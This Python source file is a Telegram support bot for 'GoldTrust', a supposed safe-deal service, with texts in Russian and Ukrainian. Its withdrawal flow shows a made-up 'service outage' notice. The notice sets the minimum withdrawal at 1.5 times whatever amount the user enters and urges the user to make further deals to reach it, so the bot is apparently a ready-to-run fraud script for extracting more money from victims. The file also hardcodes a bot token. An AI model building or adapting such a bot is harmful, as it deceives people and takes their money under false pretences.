# -*- coding: utf-8 -*-
# ------------------------------
# GoldTrust Support Bot — STABLE VERSION (27.10)
# ------------------------------

import telebot
from telebot import types

TOKEN = "8499056222:AAG2p_tSmvOZIhCILvgeA_wD3khiAF6rebc"  # встав свій токен сюди
BOT_USERNAME = "GoldTrustSupport_bot"
SUPPORT_USERNAME = "@GoldTrustSupport"

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

user_state = {}
user_data = {}

# ====== ТЕКСТИ ======
TEXTS = {
    "ru": {
        "welcome": "👋 <b>Добро пожаловать в GoldTrust!</b>\n\nВаш надёжный партнёр для безопасных сделок.",
        "profile": "👤 <b>Профиль</b>\n🔹 Пользователь: @{username}\n🔹 ID: <code>{user_id}</code>\n🔹 Язык: Русский",
        "create_ticket": "📝 <b>Создать обращение</b>\n\nВыберите тип проблемы:",
        "problem_types": ["🔸 Проблема со сделкой", "🔸 Проблема с оплатой", "🔸 Проблема с выводом", "🔸 Другое"],
        "enter_deal_code": "🔢 <b>Введите код сделки:</b>",
        "enter_agent_description": "📝 <b>Опишите ситуацию по вашей сделке/оплате:</b>",
        "enter_amount": "💰 <b>Введите сумму сделки:</b>\n\n<i>Только число</i>",
        "currency_choice": "💱 <b>Выберите валюту:</b>",
        "min_withdraw": (
            "⚠️ <b>Уважаемые пользователи!</b>\n\n"
            "В связи со сбоем сервиса автоматического вывода средств в валюте {currency}, "
            "временно введено ограничение: минимальная сумма для вывода составляет {amount} {currency}.\n\n"
            "Ваши балансы остаются в сохранности и доступны к выводу от {amount} {currency}. "
            "Чтобы вывести средства в валюте {currency}, необходимо совершить сделку(-и) на недостающую сумму, "
            "чтобы достичь минимального порога вывода.\n\n"
            "Мы уже работаем над устранением проблемы. Спасибо за понимание!"
        ),
        "agent_notification": "✅ <b>Спасибо за обращение!</b>\n\nВаша заявка будет передана агентам.",
        "support_contact": "📞 <b>Свяжитесь с агентом техподдержки:</b>\n\n👤 {support_username}\n\nОпишите ситуацию и наши специалисты помогут вам.",
        "enter_custom_problem": "📝 Пожалуйста, напишите ваше обращение (опишите проблему):",
        "verify_data": "🔍 <b>Проверьте свои данные:</b>\n\n👤 Пользователь: @{username}\n📋 Раздел: Другое\n💬 Обращение: {problem}\n\nВсё верно?",
        "data_correct": "✅ Спасибо! Ваша заявка передана агентам.",
        "data_incorrect": "📝 Хорошо, напишите обращение заново:",
        "language_changed": "🌍 <b>Язык изменён на Русский</b>"
    },

    "uk": {
        "welcome": "👋 <b>Ласкаво просимо до GoldTrust!</b>\n\nВаш надійний партнер для безпечних угод.",
        "profile": "👤 <b>Профіль</b>\n🔹 Користувач: @{username}\n🔹 ID: <code>{user_id}</code>\n🔹 Мова: Українська",
        "create_ticket": "📝 <b>Створити звернення</b>\n\nОберіть тип проблеми:",
        "problem_types": ["🔸 Проблема з угодою", "🔸 Проблема з оплатою", "🔸 Проблема з виводом", "🔸 Інше"],
        "enter_deal_code": "🔢 <b>Введіть код угоди:</b>",
        "enter_agent_description": "📝 <b>Опишіть ситуацію щодо вашої угоди/оплати:</b>",
        "enter_amount": "💰 <b>Введіть суму угоди:</b>\n\n<i>Лише число</i>",
        "currency_choice": "💱 <b>Оберіть валюту:</b>",
        "min_withdraw": (
            "⚠️ <b>Шановні користувачі!</b>\n\n"
            "Через збій сервісу автоматичного виводу коштів у валюті {currency}, "
            "тимчасово запроваджено обмеження: мінімальна сума для виводу становить {amount} {currency}.\n\n"
            "Ваші баланси в безпеці та доступні до виводу від {amount} {currency}. "
            "Щоб вивести кошти у валюті {currency}, потрібно здійснити угоди на недостаючу суму.\n\n"
            "Ми вже працюємо над усуненням проблеми. Дякуємо за розуміння!"
        ),
        "agent_notification": "✅ <b>Дякуємо!</b>\n\nВаше звернення передано агентам.",
        "support_contact": "📞 <b>Зв’яжіться з агентом техпідтримки:</b>\n\n👤 {support_username}",
        "enter_custom_problem": "📝 Будь ласка, опишіть вашу проблему:",
        "verify_data": "🔍 <b>Перевірте свої дані:</b>\n\n👤 Користувач: @{username}\n📋 Розділ: Інше\n💬 Звернення: {problem}\n\nВсе вірно?",
        "data_correct": "✅ Дякуємо! Ваше звернення передано агентам.",
        "data_incorrect": "📝 Добре, напишіть звернення заново:",
        "language_changed": "🌍 <b>Мову змінено на Українську</b>"
    }
}


# ====== ФУНКЦІЇ ======
def get_text(user_id, key, **kwargs):
    lang = user_data.get(user_id, {}).get("language", "ru")
    text = TEXTS[lang].get(key, key)
    return text.format(**kwargs) if kwargs else text


def get_main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🆘 Создать обращение", "📄 Профиль")
    markup.add("🌐 Сменить язык")
    return markup


# ====== СТАРТ ======
@bot.message_handler(commands=["start"])
def cmd_start(message):
    user_id = message.from_user.id
    user_data[user_id] = {"language": "ru"}

    bot.send_message(
        message.chat.id,
        get_text(user_id, "welcome"),
        reply_markup=get_main_menu(user_id)
    )


# ====== МЕНЮ ======
@bot.message_handler(func=lambda msg: msg.text == "📄 Профиль")
def menu_profile(message):
    user_id = message.from_user.id
    username = message.from_user.username or "—"
    bot.send_message(
        message.chat.id,
        get_text(user_id, "profile", username=username, user_id=user_id)
    )


@bot.message_handler(func=lambda msg: msg.text == "🆘 Создать обращение")
def menu_create_ticket(message):
    user_id = message.from_user.id
    user_state[user_id] = "wait_problem_type"

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for problem_type in get_text(user_id, "problem_types"):
        markup.add(problem_type)
    markup.add("🔙 Назад")

    bot.send_message(message.chat.id, get_text(user_id, "create_ticket"), reply_markup=markup)


# ====== ОБРОБКА НАЗАД ======
@bot.message_handler(func=lambda msg: msg.text == "🔙 Назад")
def go_back(message):
    user_id = message.from_user.id
    user_state.pop(user_id, None)
    bot.send_message(message.chat.id, "🔝 Повернення в головне меню:", reply_markup=get_main_menu(user_id))


# ====== ПРОБЛЕМИ ======
@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_problem_type")
def handle_problem_type(message):
    user_id = message.from_user.id
    problem_type = message.text
    types_list = get_text(user_id, "problem_types")

    if problem_type == types_list[0] or problem_type == types_list[1]:
        user_state[user_id] = "wait_deal_code"
        bot.send_message(message.chat.id, get_text(user_id, "enter_deal_code"))

    elif problem_type == types_list[2]:
        user_state[user_id] = "wait_deal_code_withdraw"
        bot.send_message(message.chat.id, get_text(user_id, "enter_deal_code"))

    elif problem_type == types_list[3]:
        user_state[user_id] = "wait_custom_problem"
        bot.send_message(message.chat.id, get_text(user_id, "enter_custom_problem"))


# ====== ДРУГОЕ ======
@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_custom_problem")
def handle_custom_problem(message):
    user_id = message.from_user.id
    user_data[user_id]["custom_problem"] = message.text

    verify_text = get_text(user_id, "verify_data",
                           username=message.from_user.username or "—",
                           problem=user_data[user_id]["custom_problem"])

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("✅ Так / Да", "❌ Ні / Нет")
    bot.send_message(message.chat.id, verify_text, reply_markup=markup)

    user_state[user_id] = "wait_verify"


@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_verify")
def verify_custom_problem(message):
    user_id = message.from_user.id
    text = message.text.lower()

    if "да" in text or "так" in text:
        bot.send_message(message.chat.id, get_text(user_id, "data_correct"), reply_markup=get_main_menu(user_id))
        user_state.pop(user_id, None)
    elif "ні" in text or "нет" in text:
        bot.send_message(message.chat.id, get_text(user_id, "data_incorrect"))
        user_state[user_id] = "wait_custom_problem"


# ====== ПРОБЛЕМА З ВИВОДОМ ======
@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_deal_code_withdraw")
def handle_withdraw(message):
    user_id = message.from_user.id
    user_state[user_id] = "wait_currency"

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🇷🇺 RUB", "🇺🇦 UAH", "🇰🇿 KZT", "🇨🇳 CNY")
    markup.add("🇧🇾 BYN", "🇪🇺 EUR", "⭐ Stars", "💎 TON", "💵 USD")
    bot.send_message(message.chat.id, get_text(user_id, "currency_choice"), reply_markup=markup)


@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_currency")
def handle_currency(message):
    user_id = message.from_user.id
    user_data[user_id]["currency"] = message.text
    user_state[user_id] = "wait_amount"

    bot.send_message(message.chat.id, get_text(user_id, "enter_amount"), reply_markup=types.ReplyKeyboardRemove())


@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_amount")
def handle_amount(message):
    user_id = message.from_user.id
    if not message.text.isdigit():
        bot.send_message(message.chat.id, "❌ Введіть лише число!")
        return

    amount = int(message.text)
    currency = user_data[user_id].get("currency", "RUB")
    formatted = f"{int(amount * 1.5):,}".replace(",", " ")

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("✅ Спасибо", "💬 Связаться с агентом")

    bot.send_message(
        message.chat.id,
        get_text(user_id, "min_withdraw", amount=formatted, currency=currency),
        reply_markup=markup
    )
    user_state[user_id] = "wait_response"


@bot.message_handler(func=lambda msg: user_state.get(msg.from_user.id) == "wait_response")
def handle_response(message):
    user_id = message.from_user.id

    if "спасибо" in message.text.lower() or "дякую" in message.text.lower():
        bot.send_message(message.chat.id, get_text(user_id, "agent_notification"), reply_markup=get_main_menu(user_id))
    elif "связаться" in message.text.lower() or "зв'язать" in message.text.lower():
        bot.send_message(message.chat.id,
                         get_text(user_id, "support_contact", support_username=SUPPORT_USERNAME),
                         reply_markup=get_main_menu(user_id))


# ====== ЗАПУСК ======
if __name__ == "__main__":
    print("🤖 GoldTrust Support Bot — STABLE VERSION")
    bot.infinity_polling()
